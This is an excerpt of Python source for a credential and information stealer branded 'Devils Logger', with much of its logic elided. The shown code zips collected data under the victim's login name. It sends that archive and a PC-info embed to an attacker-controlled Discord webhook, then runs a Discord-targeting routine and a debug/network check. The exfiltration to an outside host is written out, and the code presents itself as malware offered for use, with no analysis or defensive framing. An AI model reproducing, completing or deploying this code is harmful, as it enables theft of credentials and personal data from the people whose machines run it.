...
def main(webhook: str):
    ...
    _file = None
    _file = File(f'{localappdata}\\DEVILS-Logged-{os.getlogin()}.zip')
    ...
    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Devils")

    PcInfo()
    Discord()


def Devils(webhook: str):
    Debug()
...
class PcInfo:
    ...
    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title="Devils Logger", color=9639644)
        ...
        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Devils")
...
def zipup():
    ...
    _zipfile = os.path.join(localappdata, f'Devils-Logged-{os.getlogin()}.zip')
...
class Debug:
    ...
    def get_network(self) -> bool:
        ...
        github = "https://github.com/Badmashshelby"
